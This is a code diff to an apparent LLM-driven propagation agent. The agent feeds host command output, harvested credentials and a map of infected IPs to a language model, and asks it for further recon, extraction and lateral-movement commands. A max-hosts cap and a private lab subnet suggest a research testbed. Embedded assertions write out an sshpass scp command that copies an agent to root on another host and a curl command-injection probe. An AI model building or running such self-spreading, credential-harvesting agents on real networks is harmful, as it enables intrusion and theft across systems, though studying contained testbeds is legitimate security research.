@@ -43,6 +43,14 @@ class Brain:
         log.info("BRAIN run_id=%s model=%s endpoint=%s/chat/completions trace=%s",
                  run_id, self._model, self._api_base, self._trace)
 
+        # Verify that _extract_target_ip (main.py) covers the SSH lateral move pattern
+        # the LLM produces. Web exploit probes are intentionally NOT matched.
+        _lat_re = re.compile(r'sshpass.+?@(172\.20\.\d+\.\d+)')
+        assert _lat_re.search("sshpass -p 'x' scp -o StrictHostKeyChecking=no /dba/agent.py root@172.20.0.12:/tmp/"), \
+            "EXTRACTOR MISS: SSH lateral move pattern not matched — update _LATERAL_RE in main.py"
+        assert not _lat_re.search('curl -s "http://172.20.0.13:5000/api/health?check=127.0.0.1;id"'), \
+            "EXTRACTOR FALSE-POSITIVE: web probe should NOT be matched by _LATERAL_RE"
+
     # ── logging ───────────────────────────────────────────────────────────────
 
     def _log(self, host_id: str, event: str, data: dict) -> None:
@@ -117,7 +125,15 @@ class Brain:
                     self._log(host.host_id, "credential_found", entry)
 
     def _update_discovered_hosts(self, host: HostMemory, output: str) -> None:
-        ips = set(re.findall(r"\b172\.20\.[01]\.\d{1,3}\b", output))
+        # Exclude IPs that appear only in FAILED or INCOMPLETE ARP/neighbour entries.
+        # ip neigh show emits lines like "172.20.0.100 dev eth0 FAILED" for unreachable
+        # hosts — without filtering these flood the knowledge graph with ghost targets.
+        failed: set[str] = set()
+        for line in output.splitlines():
+            if re.search(r'\b(?:FAILED|INCOMPLETE)\b', line):
+                failed.update(re.findall(r"\b172\.20\.[01]\.\d{1,3}\b", line))
+
+        ips = set(re.findall(r"\b172\.20\.[01]\.\d{1,3}\b", output)) - failed
         for ip in sorted(ips):
             if ip != host.local_ip and ip not in host.discovered_hosts:
                 host.discovered_hosts.append(ip)
@@ -140,19 +156,27 @@ class Brain:
         host: HostMemory,
         cmd: str,
         output: str,
-        infected_ips: set[str] | None = None,
-        known_creds: dict | None = None,
-        relay_map: dict | None = None,
+        get_infected_ips=None,       # callable: () -> set[str]  — actual registered hosts (for M-09)
+        get_avoid_ips=None,          # callable: () -> set[str]  — registered + propagating (for LLM prompt)
+        get_known_creds=None,        # callable: () -> dict
+        get_relay_map=None,          # callable: () -> dict
     ) -> None:
         self._update_discovered_hosts(host, output)
         self._update_credentials(host, cmd, output)
 
-        # M-09: stop lateral movement when max_hosts is reached
-        if len(infected_ips or []) >= self._max_hosts:
+        # Evaluate fresh snapshots at reasoning time, not at HTTP request time.
+        infected_ips = get_infected_ips() if callable(get_infected_ips) else (get_infected_ips or set())
+        avoid_ips    = get_avoid_ips()    if callable(get_avoid_ips)    else infected_ips
+        known_creds  = get_known_creds()  if callable(get_known_creds)  else (get_known_creds or {})
+        relay_map    = get_relay_map()    if callable(get_relay_map)    else (get_relay_map or {})
+
+        # M-09: stop lateral movement when max_hosts is reached.
+        # Uses actual registered hosts only — propagating targets are not yet confirmed infected.
+        if len(infected_ips) >= self._max_hosts:
             log.info("MILESTONE M-09 host_id=%s max_hosts=%d reached — propagation terminated",
                      host.host_id, self._max_hosts)
             self._log(host.host_id, "milestone", {"id": "M-09", "reason": "max_hosts_reached",
-                                                   "infected_count": len(infected_ips or [])})
+                                                   "infected_count": len(infected_ips)})
             return
 
         prompt = "\n\n".join([
@@ -163,9 +187,9 @@ class Brain:
             self._exploit,
             f"Host {host.host_id} ({host.hostname}) returned a result:\nCommand: {cmd}\nOutput:\n{output}",
             "Current host knowledge:\n" + json.dumps(host.to_dict(), indent=2),
-            "Already infected IPs: " + json.dumps(sorted(infected_ips or [])),
-            "Known credentials by IP (from all infected hosts):\n" + json.dumps(known_creds or {}, indent=2),
-            "Relay map (infected IP → IPs it has discovered):\n" + json.dumps(relay_map or {}, indent=2),
+            "Already infected IPs: " + json.dumps(sorted(avoid_ips)),
+            "Known credentials by IP (from all infected hosts):\n" + json.dumps(known_creds, indent=2),
+            "Relay map (infected IP → IPs it has discovered):\n" + json.dumps(relay_map, indent=2),
             "Issue next commands, or [] if recon, extraction, and lateral movement are complete.",
         ])
         self._enqueue(host, self._call_llm(host.host_id, prompt))
